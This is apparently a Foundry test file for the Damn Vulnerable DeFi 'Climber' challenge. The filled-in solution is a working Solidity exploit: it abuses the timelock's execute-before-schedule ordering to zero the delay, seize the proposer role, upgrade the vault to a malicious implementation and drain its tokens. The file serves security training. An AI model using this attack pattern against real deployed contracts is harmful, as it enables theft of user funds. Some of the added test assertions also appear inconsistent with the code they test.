// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberTimelockBase} from "../../src/climber/ClimberTimelockBase.sol";

contract ClimberAttacker {
    ClimberTimelock public timelock;
    address public vault;
    address public token;
    address public recovery;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(ClimberTimelock _timelock, address _vault, address _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // Deploy the new implementation
        MaliciousVaultImplementation newImpl = new MaliciousVaultImplementation();

        // Prepare the malicious calls
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // Call 1: Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // Call 2: Grant proposer role to this contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // Call 3: Upgrade vault to malicious implementation
        targets[2] = vault;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImpl), "");

        // Call 4: Schedule the operation and drain (this call)
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleAndDrain()");

        // Execute the operation
        timelock.execute(targets, values, dataElements, bytes32(0));
    }

    function scheduleAndDrain() external {
        require(msg.sender == address(timelock), "Only timelock can call this");

        // Schedule the operation
        timelock.schedule(targets, values, dataElements, bytes32(0));

        // Drain the vault directly to the recovery address
        MaliciousVaultImplementation(vault).drain(token, recovery);
    }
}

contract MaliciousVaultImplementation is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init(admin);
        __UUPSUpgradeable_init();

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    function setTimelock(address timelock) external {
        _transferOwnership(timelock);
    }

    function drain(address token, address recipient) external {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}
}

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_storage_layout() public {
        // Deploy the new implementation
        MaliciousVaultImplementation newImpl = new MaliciousVaultImplementation();

        // Get the storage layout of the current implementation
        bytes32 slot0 = vm.load(address(vault), bytes32(uint256(0)));
        bytes32 slot1 = vm.load(address(vault), bytes32(uint256(1)));

        // Get the current vault's admin, proposer, and sweeper
        address admin = deployer;
        address proposer = proposer;
        address sweeper = vault.getSweeper();
        address currentTimelock = vault.owner();

        // Deploy a new proxy with the new implementation
        MaliciousVaultImplementation newProxy = MaliciousVaultImplementation(
            address(
                new ERC1967Proxy(
                    address(newImpl),
                    abi.encodeWithSignature("initialize(address,address,address)", admin, proposer, sweeper)
                )
            )
        );

        // Set the timelock to match the original vault
        newProxy.setTimelock(currentTimelock);

        // Compare storage layouts
        bytes32 newSlot0 = vm.load(address(newProxy), bytes32(uint256(0)));
        bytes32 newSlot1 = vm.load(address(newProxy), bytes32(uint256(1)));

        assertEq(slot0, newSlot0, "Storage slot 0 mismatch");
        assertEq(slot1, newSlot1, "Storage slot 1 mismatch");

        // Additional check to ensure the owner is set correctly
        assertEq(newProxy.owner(), vault.owner(), "Owner mismatch");
    }

    function test_vault_upgrade() public {
        // Deploy the new implementation
        MaliciousVaultImplementation newImpl = new MaliciousVaultImplementation();

        // Get the current vault's owner (timelock)
        address currentTimelock = vault.owner();

        // Try to upgrade as a non-owner (should fail)
        vm.expectRevert("Ownable: caller is not the owner");
        (bool success,) =
            address(vault).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImpl), ""));
        require(!success, "Upgrade should have failed");

        // Try to upgrade as the owner (should succeed)
        vm.prank(currentTimelock);
        (success,) =
            address(vault).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImpl), ""));
        require(success, "Upgrade should have succeeded");

        // Now call drain as a non-owner (should fail)
        vm.expectRevert("Ownable: caller is not the owner");
        (success,) = address(vault).call(abi.encodeWithSignature("drain(address,address)", address(token), recovery));
        require(!success, "Drain should have failed");

        // Now call drain as the owner
        vm.prank(currentTimelock);
        (success,) = address(vault).call(abi.encodeWithSignature("drain(address,address)", address(token), recovery));
        require(success, "Drain should have succeeded");

        // Check that the vault has been drained
        assertEq(token.balanceOf(address(vault)), 0, "Vault should have been drained");

        // Check that the recovery account has the correct balance
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Recovery account should have the vault's tokens");
    }

    function test_climber() public checkSolvedByPlayer {
        // Deploy the attacker contract
        ClimberAttacker attacker = new ClimberAttacker(timelock, address(vault), address(token), recovery);

        // Execute the attack
        attacker.attack();

        // Check that the timelock delay has been set to 0
        assertEq(timelock.delay(), 0);

        // Check that the attacker contract has the PROPOSER_ROLE
        assertTrue(timelock.hasRole(PROPOSER_ROLE, address(attacker)));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
